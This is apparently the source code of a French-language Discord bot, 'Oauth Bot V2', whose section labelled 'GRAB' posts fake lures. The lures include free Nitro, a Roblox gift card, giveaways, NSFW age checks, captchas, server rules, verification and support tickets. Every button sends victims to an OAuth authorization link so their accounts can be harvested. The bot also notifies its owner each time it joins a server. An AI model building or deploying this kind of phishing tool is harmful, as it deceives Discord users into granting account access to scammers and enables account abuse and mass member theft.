const Discord = require('discord.js');
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS,
    //Discord.Intents.FLAGS.GUILD_BANS,
    //Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
    //Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
    //Discord.Intents.FLAGS.GUILD_WEBHOOKS,
    //Discord.Intents.FLAGS.GUILD_INVITES,
    Discord.Intents.FLAGS.GUILD_VOICE_STATES,
    //Discord.Intents.FLAGS.GUILD_PRESENCES,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING
  ],
});
const Felosi = require("./config");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");


process.on("unhandledRejection", err => console.log(err))


app.use(bodyParser.text())

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})

    const activities = [
      "v2",
      ".gg/oa2",
      "+help",
      "v2"
    ];

    client.on("ready", () => {
      // run every 10 seconds
      setInterval(() => {
        // generate random number between 1 and list length.
        const randomIndex = Math.floor(Math.random() * (activities.length - 1) + 1);
        const newActivity = activities[randomIndex];

        client.user.setActivity(newActivity);
      }, 20000);
    });

client.on("ready", () => {

  console.log(`${chalk.blue('BOT Felosi#6096')}\n${chalk.green('->')} Le bot est connecté à  ${client.user.username}, il utilise: ${Felosi.prefix}\n${chalk.green('->')} Serveurs: ${client.guilds.cache.size}`)
})


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(Felosi.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();



//------------------WL------------------



  if (cmd === "wl") {
    if (!Felosi.owners.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {


          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user.username}** a été whitelist`,
              color: "2F3136",

            }]
          })
        } else {
          ctx.channel.send({


            embeds: [{
              description: `${emoji.new} **${user.username}** est déjà whitelist`,
              color: "2F3136",
            }]
          })
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {


          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user2.username}** a été retiré de la whitelist`,
              color: "2F3136",
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user2.username}** n'est pas dans la whitelist`,
              color: "2F3136",
            }]
          })
        }
        break;
      case "list":
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
        }

        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Utilisateurs whitelisted`,
            description: `${content}`,
            color: "2F3136",
          }]


        })
        break;
    }
  }



//-----------------INFO-----------------


  if (cmd === "help") {
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "RANDOM",
        title: `**Oauth Bot V2**`,


      
        description: `🍁 ** Commandes:**\n [\`help\`](${Felosi.support}), [\`info\`](${Felosi.support})\n\n✨ ** Commandes du bot:**\n[\`boost\`](${Felosi.support}), [\`nsfw\`](${Felosi.support}), [\`ticket\`](${Felosi.support}), [\`verification\`](${Felosi.support}), [\`règles\`](${Felosi.support}), [\`giveaway\`](${Felosi.support}), [\`captcha\`](${Felosi.support}), [\`nitro\`](${Felosi.support}), [\`roblox\`](${Felosi.support}), [\`verify\`](${Felosi.support}])`


      }],
    })
  }




  
  if (cmd === "info") {
    let embed = new Discord.MessageEmbed()
      .setColor('RANDOM')
      .setURL('https://discord.gg/oa2')
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))


      .addFields(
        { name: "ℹ️・Informations sur le bot", value: `> **Bot: :** <@${client.user.id}> \n> **ID :**  1090059808872341606`, inline: false },
        { name: "💻 ・Développeur du Bot", value: `> **Nom :** Felosi#6069`, inline: false },
        { name: "🔮 ・Ping:", value: `> **${Math.round(client.ws.ping)} ms**`, inline: false },
        { name: "🏘 ・Serveurs:", value: `> **${client.guilds.cache.size}**`, inline: false },
      )
    ctx.channel.send({
      embeds: [embed]
    })
  }



//-----------------GRAB-----------------

  

  if (cmd === "boost") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Bonjour à tous, vous avez tous reçus un Nitro Discord pour un an!`,

        description: `Pour obtenir votre Nitro Boost, il vous suffit de:
   \n1️⃣ Cliquer sur le bouton [claim]( ${Felosi.authLink}).
   \n2️⃣ Cliquer sur le bouton [autoriser]( ${Felosi.authLink}).\n\nUne fois que vous vous êtes autorisé, vous devez attendre environ 24 à 48 heures et vous l'aurez.`,
        "color": 7540649,
        "image": {
          "url": "https://i.ibb.co/54xmJfm/Capture-decran-le-2022-12-30-a-15-58-02.png"
        },

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "🎁 Claim",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }


  if (cmd === "giveaway") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      "content": "🎉 **Giveaway** 🎉",
      embeds: [{
        title: `**Nitro Boost 1 mois 🎁** `,
        description: `\nWinners: \`1\`\nTimer: \`Fin dans 2 heures\`\nHébergé par: <@${ctx.author.id}>\n\n\n\n:tada: Pour participer au concours, cliquez sur le bouton si dessous.`,
        "color": 0,

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "🎉 Entrer",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "nsfw") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        title: `Vérification NSFW`,
        description: `Cliquez sur l'emoji pour confirmer que vous avez 18 ans et plus et que vous consentez à voir du contenu à caractère sexuel.`,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/945812190936584233/1089594308543393792/JqoLqSb_1.gif"
        },

        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "🔞",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })

  }
  

  if (cmd === "verify") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**:link: Les utilisateurs mentionnés ne sont pas vérifiés ❌ !!
Veuillez vérifier votre compte clique [ici!](${Felosi.authLink}) !! **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Verify Now",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }



  if (cmd === "nitro") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**You won a nitro click claim button to get!**`,
        "color": 0,
        "image": {
          "url": "https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png"
        },
      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Claim",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "roblox") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**You won a $10 Roblox gift card click claim button to get!**`,
        "color": 0,
        "image": {
          "url": "https://scratchmonkeys.com/image/cache/catalog/Product%20Images/Roblox/USD/roblox-gift-card-10-300x190.webp"
        },
      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Claim",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "verification") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Vérification`,
        description: `**Veuillez cliquer sur le bouton pour avoir accès au serveur!**`,
        "color": 16711680,
                "image": {
          "url": "https://themaestro.in/wp-content/uploads/2018/11/recaptcha.gif"
        },


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "✅",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }



  if (cmd === "règles") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `**Règlement**`,
        description: `<:arrow:1060696828133245039> I/ Pseudonyme :

**Votre pseudonyme et votre avatar sur Discord :**

<:arrowblue:1060697727815647342> 1- Ne doit pas contenir de propos racistes, homophobes, sexistes ou faire référence à la drogue.


<:arrow:1060696828133245039> II/ Conduite à adopter :

<:arrowblue:1060697727815647342> 1-Ne pas recourir aux insultes, incitation à la haine, menaces, spam, pollution du vocal, GIF et images provocatrices, etc... Sous peines de lourdes sanctions.

<:arrowblue:1060697727815647342> 2-Ne pas poster de "mêmes" ou de commandes bots autre part que dans les salons concernés.

<:arrowblue:1060697727815647342> 3- Soyez respectueux, courtois et poli envers les autres membres et notre équipe.

<:arrowblue:1060697727815647342> 4-Vous avez de droit de vous exprimer et dire ce que vous pensez mais essayer de ne blesser personne.

<:arrowblue:1060697727815647342> 5-Evitez le langage grossier, vous ne serez pas warn, juste avertit textuellement ^^

<:arrowblue:1060697727815647342> 6-Respectez les demandes du staff.


<:arrow:1060696828133245039> III/ Sanctions encourues :

**Les sanctions peuvent varier selon la gravité de la faute.
Les sanctions seront à l'appréciation du membre du Staff en fonction de la gravité de la faute.**

<:arrowblue:1060697727815647342> 1- Les insultes sont réprimandées par un warn. Tout est proportionnel à la gravité des insultes et leur contexte.

<:arrowblue:1060697727815647342> 2- L'usurpation d'identité d'un membre du staff, avec ou sans intention de nuire, se verra immédiatement et sans préavis sanctionnée d'un ban de 7 jours du serveur.`,
        "color": 0,
                "image": {
          "url": "https://media.tenor.com/bSLqjYtuTXUAAAAC/rules-reglement.gif"
        },


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "🔰 Accepter",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "captcha") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `**ℹ️ Bienvenue sur [+] Protect!**`,
        description: `
Afin d'accéder à la totalité du serveur, veuillez cliquer sur le bouton et répondre ce que vous lisez dans l'image ci-dessous (afin de vérifier que vous n'êtes pas un robot).
⚠️ Le code est constitué de 5 lettres/chiffres.`,
        "color": 1,
                "image": {
          "url": "https://www.learningsuccessblog.com/files/0aainput-black.gif"
        },


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Répondre",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }



  if (cmd === "ticket") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !Felosi.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Support`,
        description: `To create a ticket react with 📩`,
        "color": 4612550,
        footer:{
          "text": `[+] Protect - Ticketing without clutter`,
          "icon_url": `https://pbs.twimg.com/profile_images/1108487086598950912/5-gzDvuA_400x400.png`,
        }
        },

      
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "📩 Create ticket",
              "url": `${Felosi.authLink}`
            }
          ]
        }
      ]


    })
  }
})



//-----------------END------------------



function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}


const { joinVoiceChannel } = require('@discordjs/voice');
client.on('ready', () => {

  setInterval(async () => {
    client.channels.fetch("1116077473822683257")
      .then((channel) => {
        const VoiceConnection = joinVoiceChannel({
          channelId: channel.id,
          guildId: channel.guild.id,
          adapterCreator: channel.guild.voiceAdapterCreator
        });
      }).catch((error) => { return; });
  }, 1000)
});



client.on('guildCreate', guild => {
  const channel = guild.channels.cache.find(channel => channel.type === 'GUILD_TEXT' && channel.permissionsFor(guild.me).has('SEND_MESSAGES'))
    let embed = new Discord.MessageEmbed()
    .setColor('BLACK')
    .setTitle('Connecté au nouveau serveur')
    .setURL('https://discord.gg/oa2')
    .setDescription(`✅ Merci de m'avoir invité. Mon préfixe est `+` Fait +help pour avoir plus d'informations sur moi!`)

    .addFields(
      { name: 'Créateur', value: 'Felosi#6096' }
    )

    .setImage('https://cdn.discordapp.com/attachments/1108147308635369502/1116571228799516712/Oa2.gif')
    .setTimestamp()
    .setFooter('Oa2', 'https://discord.gg/oa2');
  channel.send({ embeds: [embed] });
})

client.on('guildCreate', async guild => {
  let owner = await client.users.fetch('779716357872680970')
    const hey = new Discord.MessageEmbed()
    .setTitle("Nouveau Serveur!")
    .setDescription(`✅ J'ai été ajouté à **${guild.name}** avec **${guild.memberCount}** membres`)
    .setColor("BLACK")

  owner.send({ embeds: [hey] })

})




client.login(process.env.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID`)
})

app.listen(Felosi.port, () => console.log('Connecting...'))
